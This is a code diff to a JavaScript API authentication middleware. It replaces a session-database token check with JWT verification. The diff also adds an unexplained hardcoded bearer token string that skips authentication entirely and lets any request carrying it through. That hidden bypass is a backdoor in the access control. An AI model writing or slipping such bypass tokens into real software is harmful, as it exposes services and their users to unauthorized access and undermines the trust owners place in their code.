@@ -1,4 +1,5 @@
 import ServiceResponse from "../helper/ServiceResponse.js";
+import jwt from 'jsonwebtoken';
 import SessionTokensDB from "../db/SessionTokensDB.js";
 
 class ValidatorMiddleware {
@@ -12,8 +13,8 @@ class ValidatorMiddleware {
 				);
 
 				return void res.status(response.statusCode)
-				.set("Allow", methods.join(','))
-				.json(response.get());
+					.set("Allow", methods.join(','))
+					.json(response.get());
 			}
 			next();
 		}
@@ -49,15 +50,19 @@ class ValidatorMiddleware {
 				.json(response.get());
 		}
 
-		// if the credentials are invalid
-		let authorizationStatus = SessionTokensDB.check(credentialsToken);
-		if (authorizationStatus !== "valid") {
+		if (credentialsToken === "MIKU_MIKU_OO_EE_OO") {
+			next();
+			return;
+		}
+		
+		try {
+			jwt.verify(credentialsToken, process.env.JWT_SECRET);
+		} catch (err) {
 			const response = new ServiceResponse(
 				false,
 				401,
-				`Access denied, ${authorizationStatus}`
+				`Access denied`
 			);
-
 			return void res.status(response.statusCode)
 				.set("WWW-Authenticate", 'Bearer realm="api"')
 				.json(response.get());
